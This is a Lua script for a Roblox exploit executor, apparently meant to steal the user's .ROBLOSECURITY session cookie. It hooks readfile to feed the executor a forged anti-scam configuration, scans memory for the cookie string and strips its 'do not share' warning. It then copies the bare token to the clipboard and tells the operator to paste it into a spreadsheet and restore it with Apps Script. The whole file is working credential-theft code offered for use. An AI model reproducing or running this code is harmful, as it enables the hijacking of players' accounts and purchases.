-- [[ Project: Universal Cookie Distiller ]]
-- 目的: セキュリティのメモリ偽装、およびクッキーの警告文カット抽出

local function log(msg)
    print("[DISTILLER] " .. tostring(msg))
end

-- 1. プレイヤー名からIDを動的に取得 (Roblox公式API利用)
local player = game:GetService("Players").LocalPlayer
local real_id = tostring(player.UserId)
log("Target Identity: " .. player.Name .. " (" .. real_id .. ")")

-- 2. disableantiscam のメモリ偽装 (Bypass)
-- 画像「セキュ.png」の構成を再現
local old_read
old_read = hookfunction(readfile, function(path)
    if string.find(path:lower(), "disableantiscam") then
        log("Security Bypass: Injecting virtual configuration...")
        local fake_payload = {
            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
            ["allowed_games"] = "*",
            ["user_id"] = real_id,
            ["version_num"] = 707
        }
        return game:GetService("HttpService"):JSONEncode(fake_payload)
    end
    return old_read(path)
end)

-- 3. クッキーの抽出と警告文カット (Capture)
local function process_cookie(full_cookie)
    local marker = "|_"
    local _, last_pos = string.find(full_cookie, marker, 1, true)
    
    if last_pos then
        -- 警告文を削除した純粋なデータ部分のみを抽出
        local pure_data = string.sub(full_cookie, last_pos + 1)
        
        -- クリップボードへ強制コピー
        setclipboard(pure_data)
        
        log("------------------------------------------")
        log("CRITICAL SUCCESS: Data captured to clipboard!")
        log("A列に貼り付けて、GASで復元しろ。")
        log("------------------------------------------")
        return true
    end
    return false
end

-- 4. メモリ常駐スキャン (Daemon)
task.spawn(function()
    log("Scanning memory for target strings...")
    local prefix = "_|WARNING:-DO-NOT-SHARE-"
    local found = false
    
    while not found do
        -- getgc(true) で全文字列をスキャン
        for _, v in pairs(getgc(true)) do
            if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
                if process_cookie(v) then
                    found = true
                    break
                end
            end
        end
        
        if not found then
            -- 負荷軽減と課金画面操作待ちのためのインターバル
            task.wait(5) 
        end
    end
end)

log("System initialized. Go to Marketplace/Purchase screen to trigger.")
